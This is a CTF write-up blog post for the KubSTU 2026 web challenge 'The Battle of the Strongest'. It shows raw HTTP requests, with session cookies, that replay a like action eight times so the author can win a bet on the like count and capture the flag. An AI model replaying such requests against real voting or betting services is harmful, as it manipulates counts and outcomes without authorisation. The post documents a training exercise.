---
layout: post
title:  "The Battle of the Strongest"
date:   2026-05-02 19:17:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /KubSTU-2026-the-battle-of-the-strongest/
---

**Author**: [t.me/thankspluxury](https://t.me/thankspluxury)

**Category**: Web

**Description**: --Every semester, capybara students argue about which faculty is better, who is stronger in their studies, and who is more active in student life.

This year, capybara enthusiasts decided to turn the competition into a digital plane and created an innovative service **"The Battle of the Strongest"** (The Battle of the Strongest). But it doesn't seem to be the safest service. [http://155.212.185.30](http://155.212.185.30) [http://159.194.237.43](http://159.194.237.43)

I go the site and register and login. Looking at the javascript on the page shows me these api endpoints:
```shell
/api/music_list
/api/timer
/api/likes
/api/user_liked
/api/unlike
/api/like
```

The site says:
```shell
Every 5 minutes (300 seconds) a new round begins While the timer is running, you can put likes In your personal account, bet on the number of likes If you guess right, get the CTF flag!
```

I just send this request 8 times:
```http
POST /api/like HTTP/1.1
Host: 155.212.185.30
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://155.212.185.30/
Content-Type: application/json
Origin: http://155.212.185.30
DNT: 1
Connection: keep-alive
Cookie: web_session=af5d81475f288cab; session=eyJ1c2VyX2lkIjoxNDQ0LCJ1c2VybmFtZSI6InV6aSJ9.afUxgw.WRJZ3pEfLA-qT8rPdGzHt1zu_Fg
Priority: u=0
Content-Length: 0
```

Response:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://155.212.185.30
Content-Length: 27
Content-Type: application/json
Date: Fri, 01 May 2026 23:23:17 GMT
Server: Werkzeug/3.0.1 Python/3.11.15
Vary: Origin, Cookie

{"count":8,"success":true}
```

Then check the amount of likes for the round:
```http
GET /api/likes HTTP/1.1
Host: 155.212.185.30
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://155.212.185.30/
DNT: 1
Connection: keep-alive
Cookie: web_session=af5d81475f288cab; session=eyJ1c2VyX2lkIjoxNDQ0LCJ1c2VybmFtZSI6InV6aSJ9.afUxgw.WRJZ3pEfLA-qT8rPdGzHt1zu_Fg
Priority: u=4
```

Response:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Length: 24
Content-Type: application/json
Date: Fri, 01 May 2026 23:24:51 GMT
Server: Werkzeug/3.0.1 Python/3.11.15

{"count":8,"round":166}
```

I place the bet `8` for round `166`. After the time is up I get the flag:

![Alt text](/images/kubstuweb3.png)

`KubSTU(Y0u_ar3_champ10n)`